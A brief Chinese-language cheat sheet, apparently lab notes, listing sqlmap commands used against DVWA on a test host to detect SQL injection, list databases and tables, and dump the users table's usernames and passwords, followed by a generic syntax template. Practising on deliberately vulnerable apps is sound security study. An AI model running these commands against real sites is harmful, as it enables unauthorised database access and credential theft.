### 查找

```
C:\Python33\sqlmap1.5.4>python sqlmap.py \
 -u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 --cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
 --batch
```

### 查看数据库

```
C:\Python33\sqlmap1.5.4>python sqlmap.py 
	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe" \
	--batch \
	--dbs
```

### 查看指定数据库中的表

```
C:\Python33\sqlmap1.5.4>python sqlmap.py \
	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
	--batch  \
	-D dvwa \
	--tables
```

### 查看表结构

```
C:\Python33\sqlmap1.5.4>python sqlmap.py \
	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
	--batch  \
	-D dvwa \
	-T users \
	--columns
```

### 查看表内容

```
C:\Python33\sqlmap1.5.4>python sqlmap.py \
	-u "http://www.test1.com:88/vulnerabilities/sqli/?id=1&Submit=Submit#" \
	--cookie="security=low; PHPSESSID=ja032hk060u947310essd4nphe"  \
	--batch  \
	-D dvwa \
	-T users \
	-C "user_id,user,password" \
	--dump
```

### 语法

```
sqlmap \
-u "目标" \
--cookie="xxx" \
--batch ## 不询问输入，默认行为\
-D "数据库名" \
-T "表名" \
-C "字段名" \
--dump "爆破"
```